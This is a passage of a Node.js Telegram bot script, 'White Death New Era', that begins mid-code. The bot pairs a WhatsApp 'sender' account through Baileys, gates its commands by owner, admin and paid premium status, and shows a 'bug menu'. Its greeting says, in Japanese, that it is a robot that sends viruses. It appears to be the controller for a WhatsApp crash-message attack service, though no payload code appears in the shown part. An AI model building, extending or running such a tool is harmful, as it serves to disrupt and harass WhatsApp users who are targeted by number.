⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @RyuugaCool
☇ Name Script : White Death New Era
☇ Version : 1.7 
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false; // volatile gate: require token each restart

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const adminFile = './database/admin.json';
const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadAdmins = () => {
    try {
        const data = fs.readFileSync(adminFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const saveAdmins = (admins) => {
    try {
        fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
    } catch (err) {
    }
};

const addAdmin = (userId) => {
    const admins = loadAdmins();
    admins[userId] = true;
    saveAdmins(admins);
    return true;
};

const removeAdmin = (userId) => {
    const admins = loadAdmins();
    delete admins[userId];
    saveAdmins(admins);
    return true;
};

const isAdmin = (userId) => {
    const admins = loadAdmins();
    return admins[userId] === true || userId == ownerID;
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`

⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @RyuugaCool
☇ Name Script : White Death New Era
☇ Version : 1.7
☇ Status : Bot Connect
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.00"],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote>( 🦋 ) - Connect Sender</blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
███████╗███████╗███╗   ██╗███╗   ██╗
██╔════╝██╔════╝████╗  ██║████╗  ██║
███████╗█████╗  ██╔██╗ ██║██╔██╗ ██║
╚════██║██╔══╝  ██║╚██╗██║██║╚██╗██║
███████║███████╗██║ ╚████║██║ ╚████║
╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝⠀⠀⠀⠀
» Information:
☇ Creator : @RyuugaCool
☇ Name Script : White Death New Era-V1
☇ Version : 1.0 
☇ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addsender", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addsender 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote>( 🦋 ) - Connect Sender</blockquote>
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(videoUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote>( 🦋 ) - Connect Sender</blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("spotify", async (ctx) => {
    const chatId = ctx.chat.id;
    const query = ctx.message.text.split(" ").slice(1).join(" ");

    if (!query) {
        return ctx.reply(`🎧 Cara penggunaan:
/spotify judul lagu`);
    }

    const loading = await ctx.reply("🔎 Mencari lagu...");

    try {
        const { data } = await axios.get(
            `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`
        );

        if (!data?.status || !data?.result) {
            return ctx.telegram.editMessageText(
                chatId,
                loading.message_id,
                undefined,
                "❌ Lagu tidak ditemukan."
            );
        }

        const result = data.result;

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "⬇️ Downloading audio..."
        );

        const fileName = `${Date.now()}.mp3`;
        const filePath = path.join(__dirname, fileName);

        const response = await axios({
            method: "GET",
            url: result.audio.url,
            responseType: "stream"
        });

        const writer = fs.createWriteStream(filePath);

        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on("finish", resolve);
            writer.on("error", reject);
        });

        const formatDuration = (sec) => {
            const m = Math.floor(sec / 60);
            const s = String(sec % 60).padStart(2, "0");
            return `${m}:${s}`;
        };

        const caption = `\`\`\`JavaScript
🎧 SPOTIFY MUSIC

🎵 Title      : ${result.title}
🎤 Artist     : ${result.author || "Unknown"}
⏱ Duration   : ${formatDuration(result.duration)}
📅 Release    : ${result.uploadDate || "Unknown"}
🔗 Source     : ${result.source}

────────────────────
🚀 Powered By Forntax Engine
\`\`\``;

        await ctx.replyWithAudio(
            {
                source: fs.createReadStream(filePath)
            },
            {
                title: result.title,
                performer: result.author || "Unknown Artist",
                caption,
                parse_mode: "Markdown"
            }
        );

        fs.unlinkSync(filePath);

        await ctx.telegram.deleteMessage(chatId, loading.message_id);

    } catch (err) {
        console.error(err);

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "❌ Terjadi kesalahan saat memproses lagu."
        );
    }
});

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("delsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
    }
    
    const userId = args[1];
    addAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai admin`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgc', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgc -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgc', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgc -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const keyboardIntervals = {};

function randomColor() {
  const colors = [

    [
        [
            {
                text: "バグメニュー",
                callback_data: "/bug", 
                style: "success", 
                icon_custom_emoji_id: "5267231489610760977"
            },
            {
                text: "コントロ",
                callback_data: "/controls", 
                style: "success", 
                icon_custom_emoji_id: "5267414691440771593"
            },
        ],
        [
            {
                text: "システム開発者", 
                url: "https://t.me/RyuugaCool", 
                style: "success", 
                icon_custom_emoji_id: "5267186839130753795"
            },    
        ],
        [ 
            {   text: "ルメニュー",
                callback_data: "/tqto", 
                style: "success", 
                icon_custom_emoji_id: "5267198388297810634"
            },
            {
                text: "サポート",
                callback_data: "/tools", 
                style: "success", 
                icon_custom_emoji_id: "5267199410500028294"
            },
        ],
        [
            {
                text: "チャンネル", 
                url: "https://t.me/RyuugaCool", 
                style: "success", 
                icon_custom_emoji_id: "5265192393757443515"           
            },
        ]
    ],

    [
        [
            {
                text: "バグメニュー",
                callback_data: "/bug", 
                style: "danger", 
                icon_custom_emoji_id: "5267231489610760977"
            },
            {
                text: "コントロ",
                callback_data: "/controls", 
                style: "danger", 
                icon_custom_emoji_id: "5267414691440771593"
            },
        ],
        [
            {
                text: "システム開発者", 
                url: "https://t.me/RyuugaCool", 
                style: "danger", 
                icon_custom_emoji_id: "5267186839130753795"
            },    
        ],
        [ 
            {   text: "ルメニュー",
                callback_data: "/tqto", 
                style: "danger", 
                icon_custom_emoji_id: "5267198388297810634"
            },
            {
                text: "サポート",
                callback_data: "/tools", 
                style: "danger", 
                icon_custom_emoji_id: "5267199410500028294"
            },
        ],
        [
            {
                text: "チャンネル", 
                url: "https://t.me/RyuugaCool", 
                style: "danger", 
                icon_custom_emoji_id: "5265192393757443515"         
            },
        ]
    ],

    [
        [
            {
                text: "バグメニュー",
                callback_data: "/bug", 
                style: "primary", 
                icon_custom_emoji_id: "5267231489610760977"
            },
            {
                text: "コントロ",
                callback_data: "/controls", 
                style: "primary", 
                icon_custom_emoji_id: "5267414691440771593"
            },
        ],
        [
            {
                text: "システム開発者", 
                url: "https://t.me/RyuugaCool", 
                style: "primary", 
                icon_custom_emoji_id: "5267186839130753795"
            },    
        ],
        [ 
            {   text: "ルメニュー",
                callback_data: "/tqto", 
                style: "primary", 
                icon_custom_emoji_id: "5267198388297810634"
            },
            {
                text: "サポート",
                callback_data: "/tools", 
                style: "primary", 
                icon_custom_emoji_id: "5267199410500028294"
            },
        ],
        [
            {
                text: "チャンネル", 
                url: "https://t.me/RyuugaCool", 
                style: "primary", 
                icon_custom_emoji_id: "5265192393757443515"         
            },
        ]
    ]

  ];

  return colors[Math.floor(Math.random() * colors.length)];
}

function startBlink(ctx, chatId, messageId) {

  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
  }

  keyboardIntervals[chatId] = setInterval(async () => {
    try {

      await ctx.telegram.editMessageReplyMarkup(
        chatId,
        messageId,
        undefined,
        {
          inline_keyboard: randomColor()
        }
      );

    } catch {}

  }, 2500);
}

function stopBlink(chatId) {
  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
    delete keyboardIntervals[chatId];
  }
}


bot.start(async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const menuMessage = `
<blockquote>こんにちは、${ctx.from.first_name}。私はウイルスを送信できるロボットです。できるだけ私を活用してください。

╭═───⊱ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ───═⬡
│ ⸙ Developer: @RyuugaCool <tg-emoji emoji-id="6098160378368235844">✅</tg-emoji>
│ <tg-emoji emoji-id="6044105320140118674">✨</tg-emoji> Version: 1.0
│ <tg-emoji emoji-id="6044105320140118674">✨</tg-emoji> Prefix: /
│ <tg-emoji emoji-id="6046219062525040168">🦇</tg-emoji> Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 ───═⬡
│ <tg-emoji emoji-id="6046117795786134132">💫</tg-emoji> Sender: ${senderStatus}
│ <tg-emoji emoji-id="6044262726396546853">🦋</tg-emoji> Runtime: ${runtimeStatus}
│ <tg-emoji emoji-id="6043922668065919392">⭐️</tg-emoji> Memory: ${memoryStatus}
│ <tg-emoji emoji-id="6044024639179460298">⏰</tg-emoji> Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡</blockquote>`;

const sent = await ctx.replyWithVideo(videoUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: randomColor()
    }
  });

  const chatId = ctx.chat.id;
  startBlink(ctx, chatId, sent.message_id);
});

bot.action('/start', async (ctx) => {
    try {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);

    const menuMessage = `
<blockquote>こんにちは、${ctx.from.first_name}。私はウイルスを送信できるロボットです。できるだけ私を活用してください。

╭═───⊱ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ───═⬡
│ ⸙ Developer: @RyuugaCool <tg-emoji emoji-id="6098160378368235844">✅</tg-emoji>
│ <tg-emoji emoji-id="6044105320140118674">✨</tg-emoji> Version: 1.0
│ <tg-emoji emoji-id="6044105320140118674">✨</tg-emoji> Prefix: /
│ <tg-emoji emoji-id="6046219062525040168">🦇</tg-emoji> Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 ───═⬡
│ <tg-emoji emoji-id="6046117795786134132">💫</tg-emoji> Sender: ${senderStatus}
│ <tg-emoji emoji-id="6044262726396546853">🦋</tg-emoji> Runtime: ${runtimeStatus}
│ <tg-emoji emoji-id="6043922668065919392">⭐️</tg-emoji> Memory: ${memoryStatus}
│ <tg-emoji emoji-id="6044024639179460298">⏰</tg-emoji> Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡</blockquote>`;

    await ctx.editMessageMedia(
      {
        type: "video",
        media: videoUrl,
        caption: menuMessage,
        parse_mode: "HTML"
      },
      {
        reply_markup: {
          inline_keyboard: randomColor()
        }
      }
    );

    startBlink(ctx, ctx.chat.id, ctx.callbackQuery.message.message_id);

    await ctx.answerCbQuery();

  } catch (error) {
    await ctx.answerCbQuery();
  }
});

bot.action('/controls', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown(); 
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);
    
    const controlsMenu = `
<blockquote>こんにちは、${ctx.from.first_name}。私はウイルスを送信できるロボットです。できるだけ私を活用してください。

╭═───⊱ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ───═⬡
│ ⸙ Developer: @RyuugaCool <tg-emoji emoji-id="6098160378368235844">✅</tg-emoji>
│ <tg-emoji emoji-id="6044105320140118674">✨</tg-emoji> Version: 1.0
│ <tg-emoji emoji-id="6044105320140118674">✨</tg-emoji> Prefix: /
│ <tg-emoji emoji-id="6046219062525040168">🦇</tg-emoji> Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 ───═⬡
│ <tg-emoji emoji-id="6046117795786134132">💫</tg-emoji> Sender: ${senderStatus}
│ <tg-emoji emoji-id="6044262726396546853">🦋</tg-emoji> Runtime: ${runtimeStatus}
│ <tg-emoji emoji-id="6043922668065919392">⭐️</tg-emoji> Memory: ${memoryStatus}
│ <tg-emoji emoji-id="6044024639179460298">⏰</tg-emoji> Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═───⊱ 𝐂𝐎𝐍𝐓𝐑𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 ───═⬡
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /requestpair
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Connect To Your Whatsapp
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /delsession
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Reset Exseting Bot
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /setcd
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Setting Cooldown
